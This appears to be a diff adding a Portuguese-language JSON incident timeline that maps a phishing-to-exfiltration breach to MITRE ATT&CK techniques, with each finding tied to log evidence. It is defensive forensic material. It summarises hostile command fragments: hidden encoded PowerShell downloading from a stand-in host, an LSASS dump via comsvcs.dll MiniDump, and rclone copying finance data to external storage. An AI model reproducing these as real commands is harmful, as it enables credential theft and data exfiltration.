@@ -1,0 +1,209 @@
+[
+ {
+  "id": "A1",
+  "utc": "2026-11-10T13:02:11.341Z",
+  "host": "(e-mail)",
+  "conta": "m.silva",
+  "achado": "E-mail de faturas@pagamentos-fornecedor.example com anexo Fatura_88213.xlsm entregue",
+  "attack": [
+   "T1566.001"
+  ],
+  "evidencia": [
+   "defender_advanced_hunting.csv:4"
+  ],
+  "linha": 5
+ },
+ {
+  "id": "A2",
+  "utc": "2026-11-10T13:08:19.774Z",
+  "host": "ws-fin-023",
+  "conta": "m.silva",
+  "achado": "excel.exe → powershell -nop -w hidden -enc (DownloadString de cdn-update.example-cdn.net)",
+  "attack": [
+   "T1204.002",
+   "T1059.001",
+   "T1027"
+  ],
+  "evidencia": [
+   "defender_advanced_hunting.csv:9"
+  ],
+  "linha": 6
+ },
+ {
+  "id": "A3",
+  "utc": "2026-11-10T13:08:21.090Z",
+  "host": "ws-fin-023",
+  "conta": "m.silva",
+  "achado": "Conexão C2 para 203.0.113.45:443 (cdn-update.example-cdn.net)",
+  "attack": [
+   "T1071.001"
+  ],
+  "evidencia": [
+   "defender_advanced_hunting.csv:10",
+   "splunk_export.csv:2",
+   "elastic_dns.ndjson:2"
+  ],
+  "linha": 7
+ },
+ {
+  "id": "A4",
+  "utc": "2026-11-10T13:08:40.300Z",
+  "host": "ws-fin-023",
+  "conta": "m.silva",
+  "achado": "updater.exe gravado em AppData\\Roaming pelo powershell",
+  "attack": [
+   "T1105"
+  ],
+  "evidencia": [
+   "defender_advanced_hunting.csv:11"
+  ],
+  "linha": 8
+ },
+ {
+  "id": "A5",
+  "utc": "2026-11-10T13:09:05.118Z",
+  "host": "ws-fin-023",
+  "conta": "m.silva",
+  "achado": "Tarefa agendada MicrosoftEdgeUpdateTaskCore (onlogon, highest) → updater.exe",
+  "attack": [
+   "T1053.005"
+  ],
+  "evidencia": [
+   "defender_advanced_hunting.csv:12-13"
+  ],
+  "linha": 9
+ },
+ {
+  "id": "A6",
+  "utc": "2026-11-10T13:15:30.660Z",
+  "host": "ws-fin-023",
+  "conta": "m.silva",
+  "achado": "Dump do LSASS via comsvcs.dll MiniDump → C:\\Users\\Public\\d.bin",
+  "attack": [
+   "T1003.001"
+  ],
+  "evidencia": [
+   "defender_advanced_hunting.csv:15-17"
+  ],
+  "linha": 10
+ },
+ {
+  "id": "A7",
+  "utc": "2026-11-10T13:22:10Z–13:25:03Z",
+  "host": "(Entra)",
+  "conta": "m.silva",
+  "achado": "3 pushes MFA negados (500121) e depois sucesso, a partir de 198.51.100.77 (NL)",
+  "attack": [
+   "T1621",
+   "T1078.004"
+  ],
+  "evidencia": [
+   "entra_signin.json#2-5"
+  ],
+  "linha": 11
+ },
+ {
+  "id": "A8",
+  "utc": "2026-11-10T13:26:12Z",
+  "host": "(Entra)",
+  "conta": "m.silva",
+  "achado": "Novo método MFA registrado a partir de 198.51.100.77",
+  "attack": [
+   "T1098.005"
+  ],
+  "evidencia": [
+   "entra_audit.json#1"
+  ],
+  "linha": 12
+ },
+ {
+  "id": "A9",
+  "utc": "2026-11-10T13:30:44Z",
+  "host": "(Entra)",
+  "conta": "m.silva",
+  "achado": "Consent OAuth para \"MailSync Pro\" (Mail.Read, Mail.Send, offline_access)",
+  "attack": [
+   "T1528"
+  ],
+  "evidencia": [
+   "entra_audit.json#2"
+  ],
+  "linha": 13
+ },
+ {
+  "id": "A10",
+  "utc": "2026-11-10T13:40:12Z",
+  "host": "srv-file-01",
+  "conta": "svc_backup",
+  "achado": "RDP (4624 tipo 10) de 10.10.20.23 (ws-fin-023)",
+  "attack": [
+   "T1021.001"
+  ],
+  "evidencia": [
+   "sentinel_securityevent.json#1",
+   "wazuh_alerts.json:2",
+   "defender_advanced_hunting.csv:18-19"
+  ],
+  "linha": 14
+ },
+ {
+  "id": "A11",
+  "utc": "2026-11-10T13:52:10Z",
+  "host": "srv-file-01",
+  "conta": "svc_backup",
+  "achado": "Download de r.zip (rclone) de cdn-update.example-cdn.net",
+  "attack": [
+   "T1105"
+  ],
+  "evidencia": [
+   "sentinel_securityevent.json#4",
+   "splunk_export.csv:4"
+  ],
+  "linha": 15
+ },
+ {
+  "id": "A12",
+  "utc": "2026-11-10T13:57:40Z",
+  "host": "srv-file-01",
+  "conta": "svc_backup",
+  "achado": "rclone copy D:\\Financeiro remote:bkp → bkp.example-storage.net",
+  "attack": [
+   "T1567.002"
+  ],
+  "evidencia": [
+   "sentinel_securityevent.json#5",
+   "splunk_export.csv:5-6",
+   "wazuh_alerts.json:3"
+  ],
+  "linha": 16
+ },
+ {
+  "id": "A13",
+  "utc": "2026-11-10T14:14:58Z–14:31:10Z",
+  "host": "srv-file-01",
+  "conta": "—",
+  "achado": "~2,47 GB enviados a 198.51.100.200:443",
+  "attack": [
+   "T1567.002"
+  ],
+  "evidencia": [
+   "splunk_export.csv:7-8"
+  ],
+  "linha": 17
+ },
+ {
+  "id": "A14",
+  "utc": "2026-11-10T14:31:05Z",
+  "host": "srv-file-01",
+  "conta": "svc_backup",
+  "achado": "Log de Segurança limpo",
+  "attack": [
+   "T1070.001"
+  ],
+  "evidencia": [
+   "sentinel_securityevent.json#6",
+   "wazuh_alerts.json:4"
+  ],
+  "linha": 18
+ }
+]
